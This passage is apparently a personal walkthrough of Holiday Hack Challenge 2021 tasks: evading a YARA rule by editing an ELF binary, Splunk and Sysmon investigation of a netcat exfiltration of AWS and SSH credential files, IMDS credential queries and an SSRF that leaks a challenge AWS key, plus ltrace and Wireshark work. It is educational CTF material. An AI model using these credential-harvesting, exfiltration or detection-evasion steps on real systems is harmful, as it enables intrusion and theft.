        reference = "North Pole Malware Research Lab"
        date = "1955-04-21"
        hash = "b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03"
    strings:
        $s1 = {6c 6962 632e 736f 2e36}
        $hs2 = {726f 6772 616d 2121}
    condition:
        all of them
}
```

More strings. Appear to be printable text.

```
6c 6962 632e 736f 2e36
libc.so.6

726f 6772 616d 2121
rogram!!
```

`all of them` means both strings must be present. So we can modify the second
one.

```
$ strings -t d the_critical_elf_app  | grep -i "rogram"
8232 This is critical for the execution of this program!!
```

Let's edit offset `8232` (`0x2028`) again and modify `m` (`6d`) to `M` (`4d`).

```
$ ./the_critical_elf_app 
yara_rule_1732 ./the_critical_elf_app
```

```yaml
rule yara_rule_1732 {
   meta:
      description = "binaries - alwayz_winter.exe"
      author = "Santa"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-22"
      hash = "c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8"
   strings:
      $s1 = "This is critical for the execution of this program!!" fullword ascii
      $s2 = "__frame_dummy_init_array_entry" fullword ascii
      $s3 = ".note.gnu.property" fullword ascii
      $s4 = ".eh_frame_hdr" fullword ascii
      $s5 = "__FRAME_END__" fullword ascii
      $s6 = "__GNU_EH_FRAME_HDR" fullword ascii
      $s7 = "frame_dummy" fullword ascii
      $s8 = ".note.gnu.build-id" fullword ascii
      $s9 = "completed.8060" fullword ascii
      $s10 = "_IO_stdin_used" fullword ascii
      $s11 = ".note.ABI-tag" fullword ascii
      $s12 = "naughty string" fullword ascii
      $s13 = "dastardly string" fullword ascii
      $s14 = "__do_global_dtors_aux_fini_array_entry" fullword ascii
      $s15 = "__libc_start_main@@GLIBC_2.2.5" fullword ascii
      $s16 = "GLIBC_2.2.5" fullword ascii
      $s17 = "its_a_holly_jolly_variable" fullword ascii
      $s18 = "__cxa_finalize" fullword ascii
      $s19 = "HolidayHackChallenge{NotReallyAFlag}" fullword ascii
      $s20 = "__libc_csu_init" fullword ascii
   condition:
      uint32(1) == 0x02464c45 and filesize < 50KB and
      10 of them
}
```

We have already taken care of `s1`

```
$s1 = "This is critical for the execution of this program!!" fullword ascii
```

We probably have these remaining.

```
$s12 = "naughty string" fullword ascii
$s13 = "dastardly string" fullword ascii

$s19 = "HolidayHackChallenge{NotReallyAFlag}" fullword ascii
```

These are all case-sensitive and we can modify them again.

* s12 and s13: Change `s` (`0x73`) in `string` to `S` (`0x53`).
* s19: Change the first `H` (`0x48`) to `h` (`0x68`).

Seems like there is more. Changing some of those strings will make the file
unusable. However, I forgot to look at the conditions.

One condition is `filesize < 50KB`. It's an ELF file, we can append garbage to
the end of the file to make it larger than 50KB to bypass this check. We can use
`dd`. First I just overwrote the file and had to start from scratch. We need to
`append` the zeroes.

```
$ dd if=/dev/zero bs=100KB count=1 >> the_critical_elf_app
1+0 records in
1+0 records out
100000 bytes (100 kB, 98 KiB) copied, 0.000135379 s, 739 MB/s
```

And we are good.

```
$ ./the_critical_elf_app 
Machine Running.. 
Toy Levels: Very Merry, Terry
Naughty/Nice Blockchain Assessment: Untampered
Candy Sweetness Gauge: Exceedingly Sugarlicious
Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564
```

The hex string is `Jolly Enough, Overtime Approved`.

Hints from Fitzy:

> Did you know Splunk recently added support for new data sources including
> Sysmon for Linux and GitHub Audit Log data?
>
> Between GitHub audit log and webhook event recording, you can monitor all
> activity in a repository, including common git commands such as git add, git
> status, and git commit.
>
> You can also see cloned GitHub projects. There's a lot of interesting stuff
> out there. Did you know there are repositories of code that are Darn
> Vulnerable?
>
> Sysmon provides a lot of valuable data, but sometimes correlation across data
> types is still necessary.
>
> Sysmon network events don't reveal the process parent ID for example.
> Fortunately, we can pivot with a query to investigate process creation events
> once you get a process ID.
>
> Sometimes Sysmon data collection is awkward. Pipelining multiple commands
> generates multiple Sysmon events, for example.
>
> Did you know there are multiple versions of the Netcat command that can be used
> maliciously? nc.openbsd, for example.

## Angel Candysalt - Splunk!
Teleport to `KringleCon > Great Room` for the Splunk challenge.

Angel does not have any hints. The terminal does
at https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs.

> Eddie McJingles was a key DevOps engineer in Santa's North Pole Partner
> Program, but he left suddenly. Your job is to document Eddie's project.
> 
> To complete this challenge, you need to search in Splunk and maybe a few
> places on the Internet! To access the Splunk search interface, just click the
> Search link in the navigation bar in the upper left hand corner of the page.
> 
> New to Splunk? Check out the sample [search][splunk-search] links provided.
> 
> This challenge is designed for a laptop or desktop computer with screen width
> of 1600 pixels or more.

[splunk-search]: https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search

Searching happens at
[https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search][splunk-search].

### Task 1
Answer: `git status`.

> Capture the commands Eddie ran most often, starting with git. Looking only at
> his process launches as reported by Sysmon, record the most common git-related
> CommandLine that Eddie seemed to use.

1. Click the 2nd link `Sysmon for Linux - Process creation`. 
2. Select `ParentUser` in the left sidebar and select `eddie`.
3. Click on `CommandLine` in the left sidebar and see the top values.

Answer is `git status`.

### Task 2
Answer: `git@github.com:elfnp3/partnerapi.git`.

> Looking through the git commands Eddie ran, determine the remote repository
> that he configured as the origin for the 'partnerapi' repo. The correct one!

We will add `CommandLine=*add*origin*` to the previous search to only return
command-lines with `add` and `origin` in them. There are two commands:

```
git remote add origin https://github.com/elfnp3/partnerapi.git

git remote add origin git@github.com:elfnp3/partnerapi.git
```

The answer is `git@github.com:elfnp3/partnerapi.git` (I tried the HTTPs URL and
it did not work).

### Task 3
Answer: `docker compose up`.

> The 'partnerapi' project that Eddie worked on uses Docker. Gather the full
> docker command line that Eddie used to start the 'partnerapi' project on his
> workstation.

We modify previous search with `CommandLine=*docker*`. There are 14 results.
Click on `CommandLine` in the sidebar to see the command. We want
`docker compose up`.

### Task 4
Answer: `https://github.com/snoopysecurity/dvws-node`.

> Eddie had been testing automated static application security testing (SAST) in
> GitHub. Vulnerability reports have been coming into Splunk in JSON format via
> GitHub webhooks. Search all the events in the main index in Splunk and use the
> sourcetype field to locate these reports. Determine the URL of the vulnerable
> GitHub repository that the elves cloned for testing and document it here. You
> will need to search outside of Splunk (try GitHub) for the original name of
> the repository.

I cheated. We know the repository in task 2 was `elfnp3/partnerapi.git` so I
just went to [https://github.com/elfnp3][elfnp3-gh] and saw a fork named
`dvws-node`. The original repository is
[https://github.com/snoopysecurity/dvws-node][dvws-orig].

[elfnp3-gh]: https://github.com/elfnp3
[dvws-orig]: https://github.com/snoopysecurity/dvws-node

### Task 5
Answer: `holiday-utils-js`.

> Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi'
> project. Determine the name of the library and record it here for our workshop
> documentation.

1. Click the 2nd link `Sysmon for Linux - Process creation`. 
2. Select `ParentUser` in the left sidebar and select `eddie`.
3. Add `CommandLine=*package.json*` to the search term.
4. Click on `CommandLine` to see
   `git commit package.json -m Added holiday-utils-js dependency`.

### Task 6
Answer: `/usr/bin/nc.openbsd`.

> Another elf started gathering a baseline of the network activity that Eddie
> generated. Start with their search and capture the full process_name field of
> anything that looks suspicious.

Click on `their search` and there are three total results with two `dest_ip`s:

* `192.30.255.113`: `process_name` for both is `/usr/bin/git`.
* `54.175.69.219`: `process_name` is `/usr/bin/nc.openbsd` that we got from the hint.

### Task 7
Answer: `6`.

> Uh oh. This documentation exercise just turned into an investigation. Starting
> with the process identified in the previous task, look for additional
> suspicious commands launched by the same parent process. One thing to know
> about these Sysmon events is that Network connection events don't indicate the
> parent process ID, but Process creation events do! Determine the number of
> files that were accessed by a related process and record it here.

1. Click on sample 2 `Sysmon for Linux - Process creation`.
2. Add `process_name="/usr/bin/nc.openbsd"`.One result.
3. Click on `ParentProcessId` or `parent_process_id` and see `6788`.
   1. Now we need to search for all processes with this parent.
4. Remove the previous query and add `ParentProcessId=6788`. Two results
5. Click on `CommandLine` in the left sidebar.
   1. `nc -q1 54.175.69.219 16842`: Not what we want.
   2. `cat ...` is the answer. Six files were accessed.

```
cat
   /home/eddie/.aws/credentials
   /home/eddie/.ssh/authorized_keys
   /home/eddie/.ssh/config
   /home/eddie/.ssh/eddie
   /home/eddie/.ssh/eddie.pub
   /home/eddie/.ssh/known_hosts
```

### Task 8
Answer: `preinstall.sh`.

> Use Splunk and Sysmon Process creation data to identify the name of the Bash
> script that accessed sensitive files and (likely) transmitted them to a remote
> IP address.

Adding `CommandLine=*.sh*` does not return anything good. Trying the files in
the previous task also only return the `cat` command that we've already seen.

1. Click on sample 2 `Sysmon for Linux - Process creation`.
2. Select user `eddie`.
3. Click on `process_name` and select `/usr/bin/bash`.
4. Click on `CommandLine` and see `/bin/bash preinstall.sh`

> Thank you for helping Santa complete his investigation! Santa says you're a
> whiz!

----------

# 10) Now Hiring!

> What is the secret access key for the
> [Jack Frost Tower job applications > server][frost-job]? Brave the perils of
> Jack's bathroom to get hints from Noxious O. D'or.

[frost-job]: https://apply.jackfrosttower.com/

## Noxious O. D'or - IMDS Exploration
Teleport `FrostFest > Jack's Restroom`.

> You know, I'm having some trouble with this IMDS exploration. I'm hoping you
> can give me some help in solving it.
>
> If you do, I'll be happy to trade you for some hints on SSRF! I've been
> studying up on that and have some good ideas on how to attack it!

```json 
$ ping 169.254.169.254

$ curl http://169.254.169.254
latest

$ curl http://169.254.169.254/latest
dynamic
meta-data

$ curl http://169.254.169.254/latest/dynamic
fws/instance-monitoring
instance-identity/document
instance-identity/pkcs7
instance-identity/signature

$ curl http://169.254.169.254/latest/dynamic/instance-identity/document
{
    "accountId": "PCRVQVHN4S0L4V2TE",
    "imageId": "ami-0b69ea66ff7391e80",
    "availabilityZone": "np-north-1f",
    "ramdiskId": null,
    "kernelId": null,
    "devpayProductCodes": null,
    "marketplaceProductCodes": null,
    "version": "2017-09-30",
    "privateIp": "10.0.7.10",
    "billingProducts": null,
    "instanceId": "i-1234567890abcdef0",
    "pendingTime": "2021-12-01T07:02:24Z",
    "architecture": "x86_64",
    "instanceType": "m4.xlarge",
    "region": "np-north-1"
}

$ curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
// same as above

$ curl http://169.254.169.254/latest/meta-data
// removed
product-codes
public-hostname
public-ipv4
public-keys/0/openssh-key
reservation-id
security-groups
services/domain
services/partition
spot/instance-action
spot/termination-time

$ curl http://169.254.169.254/latest/meta-data/public-hostname
ec2-192-0-2-54.compute-1.amazonaws.com

$ curl http://169.254.169.254/latest/meta-data/public-hostname ; echo

$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials ; echo
elfu-deploy-role

$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role ; echo
{
    "Code": "Success",
    "LastUpdated": "2021-12-02T18:50:40Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2026-12-02T18:50:40Z"
}

$ cat gettoken.sh 
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

$ source gettoken.sh

$ echo $TOKEN

$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region ; echo
np-north-1
```

Hint from Noxious

> Cloud assets are interesting targets for attackers. Did you know they
> automatically get IMDS access?
>
> I'm very concerned about the combination of SSRF and IMDS access.
>
> Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks?
>
> Dr. Petabyte told us, "anytime you see URL as an input, test for SSRF."
>
> With an SSRF attack, we can make the server request a URL. This can reveal
> valuable data!
>
> The [AWS documentation for IMDS][imds-aws-metadata] is interesting reading.

[imds-aws-metadata]: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

## Now Hiring!
After navigating to https://apply.jackfrosttower.com/?p=opportunities none of
the images can be displayed.

Looking the request in Burp we see they are retrieving the IMDS responses we saw
in the terminal challenge.

```json
$ https://apply.jackfrosttower.com/images/1.jpg
dynamic
meta-data

All three have the same response
https://apply.jackfrosttower.com/images/2.jpg
https://apply.jackfrosttower.com/images/3.jpg
https://apply.jackfrosttower.com/images/4.jpg
{
	"Code": "Success",
	"LastUpdated": "2021-05-02T18:50:40Z",
	"Type": "AWS-HMAC",
	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
	"Expiration": "2026-05-02T18:50:40Z"
}
```

Which is the answer `CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX`.

The `Apply` page is a normal form. The only thing is the default text in a field
which is this URL: http://nppd.northpolechristmastown.com/NLBI/YourReportIdGoesHere

http://nppd.northpolechristmastown.com/needhelp is the page for the North Pole
Police Department.

Infractions are here: http://nppd.northpolechristmastown.com/infractions

----------

# 11) Customer Complaint Analysis
Answer: `Flud Hagg Yaqh`.

> A human has accessed the Jack Frost Tower network with a non-compliant host.
> Which three trolls complained about the human?
> Enter the troll names in alphabetical order separated by spaces. Talk to
> Tinsel Upatree in the kitchen for hints.

This is what Pat Tronizer was talking about.

## Pat Tronizer
Using the Frostavator we can click the `Talks` button.

We see Pat Tronizer there:

> Anyway, I cannot believe an actual human connected to the Tower network. It's
> supposed to be the domain of us trolls and of course Jack Frost himself.
>
> Mr. Frost has a strict policy: all devices must be [RFC3514][rfc3514]
> compliant. It fits in with our nefarious plans.
>
> Some human had the nerve to use our complaint website to submit a complaint!
>
> That website is for trolls to complain about guests, NOT the other way around.

[rfc3514]: https://datatracker.ietf.org/doc/html/rfc3514

RFC3514 is the security flag in the IPv4 header.

There's a pcap file to look at.

## Tinsel Upatree - Strace Ltrace Retrace
Answer: A file named `registration.json` with content `Registration: True`.

Tinsel is in the kitchen. The kitchen can be accessed from the dining room which
is the door in the left of the lobby.

> Well, regardless – and more to the point, what do you know about tracing
> processes in Linux?
>
> We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we
> seem to be missing a file.
>
> Do you think you can use strace or ltrace to help us rebuild the missing
> config?
>
> And, if you help me with this, I'll give you some hints about using Wireshark
> filters to look for unusual options that might help you achieve Objectives
> here at the North Pole.

```
$ ls
make_the_candy*

$ ./make_the_candy 
Unable to open configuration file.
```

I wrote some stuff about configuring `ltrace` in 2015 at
{{< xref
    path="/post/2015/2015-01-06-tales-from-the-crypt-o-leaking-aes-keys.markdown"
    anchor="23--using-ltrace-to-find-the-key"
    text="Tales from the Crypt(o) - Leaking AES Keys - Using ltrace to Find the Key" >}}

```
$ ltrace ./make_the_candy 
fopen("registration.json", "r")          = 0
puts("Unable to open configuration fil"...Unable to open configuration file.) = 35
+++ exited (status 1) +++
```

It's looking for `registration.json`. Let's create such a file and try again.

```
$ ltrace ./make_the_candy 

fopen("registration.json", "r")          = 0x55fd94d15260
getline(0x7ffc624d4510, 0x7ffc624d4518, 0x55fd94d15260, 0x7ffc624d4518) = -1
puts("Unregistered - Exiting."Unregistered - Exiting.)          = 24
+++ exited (status 1) +++
```

`getline` reads one line and because our file is empty, we are not registered.
There's no `strings` here so we cannot figure out if it's looking for a specific
string here. That said, we can always use the vim and xxd trick we used before.
I did not see any strings here even `registration`.

Let's put `123456` in the file and see what happens.

```
$ ltrace ./make_the_candy 

fopen("registration.json", "r")                           = 0x5593f3271260
getline(0x7ffc23db76a0, 0x7ffc23db76a8, 0x5593f3271260, 0x7ffc23db76a8) = 7
strstr("123456\n", "Registration")                        = nil
getline(0x7ffc23db76a0, 0x7ffc23db76a8, 0x5593f3271260, 0x7ffc23db76a8) = -1
puts("Unregistered - Exiting."Unregistered - Exiting.)                  = 24
+++ exited (status 1) +++
```

So it's looking for `Registration` in the file, see `strstr`. Let's put it there
and try again.

```
strstr("Registration\n", "Registration")                  = "Registration\n"
strchr("Registration\n", ':')                             = nil
```

`strchr` wants to find `:` in the string. Let's put `Registration:123456` in the
file.

```
strstr("Registration:123456\n", "Registration")           = "Registration:123456\n"
strchr("Registration:123456\n", ':')                      = ":123456\n"
strstr(":123456\n", "True")                               = nil
```

Let's put `Registration: True` in the file and it works.

Tinsel hint:

> Are you familiar with [RFC3514][rfc3514]?
>
> Wireshark uses a different name for the Evil Bit: `ip.flags.rb`.
>
> HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses
> them for us automatically.
>
> You can search for strings in Wireshark fields using
> [display filters][wireshark-displayfilter] with the contains keyword.

[wireshark-displayfilter]: https://wiki.wireshark.org/DisplayFilters

## Customer Complaint Analysis
Open the pcap file in Wireshark.

Three trolls in alphabetical order who complained about the human.

We can filter POST methods with `http.request.method == POST` which returns 16.
But trolls have to be RFC3514 compliant and have the security flag set. Add this
to the Wireshark filter to only see requests from trolls.

`http.request.method == POST and ip.flags.rb` has the same results.

Looking in the complaints, we see a complaints from a human in room 1024. So
let's search for HTTP requests that have `1024` in them.

`http contains "1024"` returns four results. One is the human complaining and
the other three are trolls. In alphabetical order: `Flud Hagg Yaqh`.
